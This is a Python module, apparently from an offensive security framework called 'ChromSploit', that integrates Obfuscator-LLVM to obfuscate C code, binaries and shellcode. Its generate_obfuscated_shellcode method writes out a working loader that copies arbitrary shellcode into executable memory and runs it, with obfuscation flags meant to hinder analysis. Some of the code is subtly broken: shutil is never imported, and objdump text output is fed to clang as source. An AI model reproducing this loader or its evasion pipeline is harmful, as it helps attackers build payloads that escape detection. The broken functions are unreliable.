#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
OLLVM Obfuscation Integration
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import subprocess
import tempfile
from typing import Dict, List, Any, Optional, Tuple, Union

from core.colors import Colors
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils

class OLLVMIntegration:
    """
    Integration des Obfuscator-LLVM (OLLVM) in ChromSploit
    """
    
    def __init__(self, logger: Optional[Logger] = None):
        """
        Initialisiert die OLLVM-Integration
        
        Args:
            logger (Logger, optional): Logger-Instanz
        """
        self.logger = logger
        self.ollvm_path = "/opt/obfuscator-llvm"
        self.clang_path = os.path.join(self.ollvm_path, "bin", "clang")
        self.clangpp_path = os.path.join(self.ollvm_path, "bin", "clang++")
    
    def log(self, level: str, message: str) -> None:
        """
        Loggt eine Nachricht
        
        Args:
            level (str): Log-Level
            message (str): Nachricht
        """
        if self.logger:
            if level == "info":
                self.logger.info(message)
            elif level == "warning":
                self.logger.warning(message)
            elif level == "error":
                self.logger.error(message)
            elif level == "debug":
                self.logger.debug(message)
        else:
            print(f"{Colors.BLUE}[*] {message}{Colors.RESET}" if level == "info" else
                  f"{Colors.YELLOW}[!] {message}{Colors.RESET}" if level == "warning" else
                  f"{Colors.RED}[-] {message}{Colors.RESET}" if level == "error" else
                  f"{Colors.MAGENTA}[D] {message}{Colors.RESET}")
    
    def is_available(self) -> bool:
        """
        Überprüft, ob OLLVM verfügbar ist
        
        Returns:
            bool: True, wenn OLLVM verfügbar ist, sonst False
        """
        return os.path.exists(self.clang_path) or os.path.exists(self.clangpp_path)
    
    def get_version(self) -> str:
        """
        Gibt die OLLVM-Version zurück
        
        Returns:
            str: Die OLLVM-Version oder "Unbekannt" bei Fehler
        """
        try:
            if os.path.exists(self.clang_path):
                result = subprocess.run([self.clang_path, "--version"], 
                                     capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            elif os.path.exists(self.clangpp_path):
                result = subprocess.run([self.clangpp_path, "--version"], 
                                     capture_output=True, text=True, timeout=10)
                return result.stdout.strip()
            return "Nicht verfügbar"
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der OLLVM-Version: {str(e)}")
            return "Unbekannt"
    
    def install(self) -> bool:
        """
        Installiert OLLVM, falls es nicht verfügbar ist
        
        Returns:
            bool: True bei erfolgreicher Installation, sonst False
        """
        if self.is_available():
            self.log("info", "OLLVM ist bereits installiert")
            return True
        
        self.log("info", "Installiere OLLVM...")
        
        try:
            # Abhängigkeiten installieren
            self.log("info", "Installiere Abhängigkeiten...")
            deps_cmd = "sudo apt-get update && sudo apt-get install -y build-essential cmake ninja-build git python3"
            subprocess.run(deps_cmd, shell=True, check=True)
            
            # Temporäres Verzeichnis erstellen
            temp_dir = tempfile.mkdtemp()
            
            # OLLVM klonen
            self.log("info", "Klone OLLVM-Repository...")
            clone_cmd = f"git clone https://github.com/obfuscator-llvm/obfuscator.git {temp_dir}"
            subprocess.run(clone_cmd, shell=True, check=True)
            
            # Build-Verzeichnis erstellen
            build_dir = os.path.join(temp_dir, "build")
            os.makedirs(build_dir, exist_ok=True)
            
            # OLLVM konfigurieren
            self.log("info", "Konfiguriere OLLVM...")
            os.chdir(build_dir)
            configure_cmd = f"cmake -G Ninja -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF -DLLVM_TARGETS_TO_BUILD=X86 .."
            subprocess.run(configure_cmd, shell=True, check=True)
            
            # OLLVM bauen
            self.log("info", "Baue OLLVM (dies kann einige Zeit dauern)...")
            build_cmd = "ninja"
            subprocess.run(build_cmd, shell=True, check=True)
            
            # OLLVM installieren
            self.log("info", "Installiere OLLVM...")
            install_cmd = f"sudo mkdir -p {self.ollvm_path} && sudo cp -r {build_dir}/bin {self.ollvm_path}/ && sudo cp -r {build_dir}/lib {self.ollvm_path}/"
            subprocess.run(install_cmd, shell=True, check=True)
            
            # Aufräumen
            self.log("info", "Räume auf...")
            cleanup_cmd = f"rm -rf {temp_dir}"
            subprocess.run(cleanup_cmd, shell=True, check=True)
            
            # Überprüfen, ob die Installation erfolgreich war
            if self.is_available():
                self.log("info", "OLLVM wurde erfolgreich installiert")
                return True
            else:
                self.log("error", "OLLVM-Installation fehlgeschlagen")
                return False
        except Exception as e:
            self.log("error", f"Fehler bei der OLLVM-Installation: {str(e)}")
            return False
    
    def obfuscate_c_code(self, 
                        source_file: str, 
                        output_file: Optional[str] = None, 
                        obfuscation_level: int = 2,
                        is_cpp: bool = False) -> Optional[str]:
        """
        Obfuskiert C/C++-Code mit OLLVM
        
        Args:
            source_file (str): Pfad zur Quelldatei
            output_file (str, optional): Pfad zur Ausgabedatei
            obfuscation_level (int, optional): Obfuskierungslevel (1-3)
            is_cpp (bool, optional): Ob es sich um C++-Code handelt
            
        Returns:
            str: Pfad zur obfuskierten Datei oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "OLLVM ist nicht verfügbar")
            return None
        
        if not os.path.exists(source_file):
            self.log("error", f"Quelldatei existiert nicht: {source_file}")
            return None
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "ollvm")
            PathUtils.ensure_dir_exists(output_dir)
            
            base_name = os.path.basename(source_file)
            name, ext = os.path.splitext(base_name)
            
            output_file = os.path.join(output_dir, f"{name}_obfuscated{ext}")
        
        # Compiler-Pfad festlegen
        compiler = self.clangpp_path if is_cpp else self.clang_path
        
        # Obfuskierungsflags basierend auf Level
        obfuscation_flags = []
        
        if obfuscation_level >= 1:
            # Level 1: Control Flow Flattening
            obfuscation_flags.extend(["-mllvm", "-fla"])
        
        if obfuscation_level >= 2:
            # Level 2: + Instruction Substitution
            obfuscation_flags.extend(["-mllvm", "-sub"])
        
        if obfuscation_level >= 3:
            # Level 3: + Bogus Control Flow
            obfuscation_flags.extend(["-mllvm", "-bcf"])
            
            # Zusätzliche Optionen für Level 3
            obfuscation_flags.extend(["-mllvm", "-bcf_prob=80", "-mllvm", "-bcf_loop=3"])
        
        self.log("info", f"Obfuskiere {'C++' if is_cpp else 'C'}-Code mit Level {obfuscation_level}...")
        
        try:
            # Befehl zum Obfuskieren erstellen
            cmd = [compiler, source_file, "-o", output_file]
            cmd.extend(obfuscation_flags)
            
            # Code obfuskieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.log("info", f"Code erfolgreich obfuskiert: {output_file}")
                return output_file
            else:
                self.log("error", f"Fehler beim Obfuskieren des Codes: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Obfuskieren des Codes: {str(e)}")
            return None
    
    def obfuscate_binary(self, 
                        source_file: str, 
                        output_file: Optional[str] = None,
                        obfuscation_level: int = 2) -> Optional[str]:
        """
        Obfuskiert eine ausführbare Datei mit OLLVM
        
        Args:
            source_file (str): Pfad zur Quelldatei
            output_file (str, optional): Pfad zur Ausgabedatei
            obfuscation_level (int, optional): Obfuskierungslevel (1-3)
            
        Returns:
            str: Pfad zur obfuskierten Datei oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "OLLVM ist nicht verfügbar")
            return None
        
        if not os.path.exists(source_file):
            self.log("error", f"Quelldatei existiert nicht: {source_file}")
            return None
        
        # Temporäres Verzeichnis erstellen
        temp_dir = tempfile.mkdtemp()
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "ollvm")
            PathUtils.ensure_dir_exists(output_dir)
            
            base_name = os.path.basename(source_file)
            name, ext = os.path.splitext(base_name)
            
            output_file = os.path.join(output_dir, f"{name}_obfuscated{ext}")
        
        self.log("info", f"Obfuskiere Binärdatei mit Level {obfuscation_level}...")
        
        try:
            # Binärdatei disassemblieren
            self.log("info", "Disassembliere Binärdatei...")
            disasm_file = os.path.join(temp_dir, "disasm.ll")
            disasm_cmd = f"objdump -d {source_file} > {disasm_file}"
            subprocess.run(disasm_cmd, shell=True, check=True)
            
            # Obfuskierungsflags basierend auf Level
            obfuscation_flags = []
            
            if obfuscation_level >= 1:
                obfuscation_flags.extend(["-mllvm", "-fla"])
            
            if obfuscation_level >= 2:
                obfuscation_flags.extend(["-mllvm", "-sub"])
            
            if obfuscation_level >= 3:
                obfuscation_flags.extend(["-mllvm", "-bcf"])
                obfuscation_flags.extend(["-mllvm", "-bcf_prob=80", "-mllvm", "-bcf_loop=3"])
            
            # Binärdatei obfuskieren
            self.log("info", "Obfuskiere Binärdatei...")
            obfuscate_cmd = f"{self.clang_path} {disasm_file} -o {output_file} {' '.join(obfuscation_flags)}"
            subprocess.run(obfuscate_cmd, shell=True, check=True)
            
            # Ausführungsrechte setzen
            os.chmod(output_file, 0o755)
            
            # Aufräumen
            cleanup_cmd = f"rm -rf {temp_dir}"
            subprocess.run(cleanup_cmd, shell=True, check=True)
            
            self.log("info", f"Binärdatei erfolgreich obfuskiert: {output_file}")
            return output_file
        except Exception as e:
            self.log("error", f"Fehler beim Obfuskieren der Binärdatei: {str(e)}")
            
            # Aufräumen
            try:
                cleanup_cmd = f"rm -rf {temp_dir}"
                subprocess.run(cleanup_cmd, shell=True)
            except:
                pass
            
            return None
    
    def generate_obfuscated_shellcode(self, 
                                     shellcode_file: str, 
                                     output_file: Optional[str] = None,
                                     obfuscation_level: int = 2,
                                     format_type: str = "c") -> Optional[str]:
        """
        Generiert obfuskierten Shellcode
        
        Args:
            shellcode_file (str): Pfad zur Shellcode-Datei
            output_file (str, optional): Pfad zur Ausgabedatei
            obfuscation_level (int, optional): Obfuskierungslevel (1-3)
            format_type (str, optional): Ausgabeformat (c, cpp, exe)
            
        Returns:
            str: Pfad zum obfuskierten Shellcode oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "OLLVM ist nicht verfügbar")
            return None
        
        if not os.path.exists(shellcode_file):
            self.log("error", f"Shellcode-Datei existiert nicht: {shellcode_file}")
            return None
        
        # Temporäres Verzeichnis erstellen
        temp_dir = tempfile.mkdtemp()
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "ollvm")
            PathUtils.ensure_dir_exists(output_dir)
            
            base_name = os.path.basename(shellcode_file)
            name, ext = os.path.splitext(base_name)
            
            if format_type == "c":
                ext = ".c"
            elif format_type == "cpp":
                ext = ".cpp"
            elif format_type == "exe":
                ext = ".exe"
            
            output_file = os.path.join(output_dir, f"{name}_obfuscated{ext}")
        
        self.log("info", f"Generiere obfuskierten Shellcode mit Level {obfuscation_level}...")
        
        try:
            # Shellcode in C-Code einbetten
            self.log("info", "Bette Shellcode in C-Code ein...")
            
            # Shellcode aus Datei lesen
            with open(shellcode_file, "rb") as f:
                shellcode_bytes = f.read()
            
            # C-Code-Template erstellen
            c_code = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
"""
            
            # Shellcode als Byte-Array hinzufügen
            for i, byte in enumerate(shellcode_bytes):
                if i % 12 == 0:
                    c_code += "\n    "
                c_code += f"0x{byte:02x}, "
            
            c_code += """
};

int main(int argc, char **argv) {
    void *mem = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    
    int (*sc)() = mem;
    return sc();
}
"""
            
            # C-Code in temporäre Datei schreiben
            c_file = os.path.join(temp_dir, "shellcode.c")
            with open(c_file, "w") as f:
                f.write(c_code)
            
            # Obfuskierungsflags basierend auf Level
            obfuscation_flags = []
            
            if obfuscation_level >= 1:
                obfuscation_flags.extend(["-mllvm", "-fla"])
            
            if obfuscation_level >= 2:
                obfuscation_flags.extend(["-mllvm", "-sub"])
            
            if obfuscation_level >= 3:
                obfuscation_flags.extend(["-mllvm", "-bcf"])
                obfuscation_flags.extend(["-mllvm", "-bcf_prob=80", "-mllvm", "-bcf_loop=3"])
            
            # Shellcode obfuskieren
            self.log("info", "Obfuskiere Shellcode...")
            
            if format_type == "c" or format_type == "cpp":
                # Nur C-Code generieren
                shutil.copy(c_file, output_file)
                result = True
            else:
                # Ausführbare Datei generieren
                cmd = [self.clang_path, c_file, "-o", output_file]
                cmd.extend(obfuscation_flags)
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                result = result.returncode == 0
            
            # Aufräumen
            cleanup_cmd = f"rm -rf {temp_dir}"
            subprocess.run(cleanup_cmd, shell=True, check=True)
            
            if result:
                self.log("info", f"Shellcode erfolgreich obfuskiert: {output_file}")
                
                # Ausführungsrechte setzen, falls es eine ausführbare Datei ist
                if format_type == "exe":
                    os.chmod(output_file, 0o755)
                
                return output_file
            else:
                self.log("error", "Fehler beim Obfuskieren des Shellcodes")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des obfuskierten Shellcodes: {str(e)}")
            
            # Aufräumen
            try:
                cleanup_cmd = f"rm -rf {temp_dir}"
                subprocess.run(cleanup_cmd, shell=True)
            except:
                pass
            
            return None
    
    def get_obfuscation_options(self) -> Dict[str, List[str]]:
        """
        Gibt verfügbare Obfuskierungsoptionen zurück
        
        Returns:
            dict: Verfügbare Obfuskierungsoptionen
        """
        return {
            "techniques": [
                "fla - Control Flow Flattening",
                "sub - Instruction Substitution",
                "bcf - Bogus Control Flow"
            ],
            "levels": [
                "1 - Niedrig (nur Control Flow Flattening)",
                "2 - Mittel (Control Flow Flattening + Instruction Substitution)",
                "3 - Hoch (Control Flow Flattening + Instruction Substitution + Bogus Control Flow)"
            ],
            "formats": [
                "c - C-Quellcode",
                "cpp - C++-Quellcode",
                "exe - Ausführbare Datei"
            ]
        }
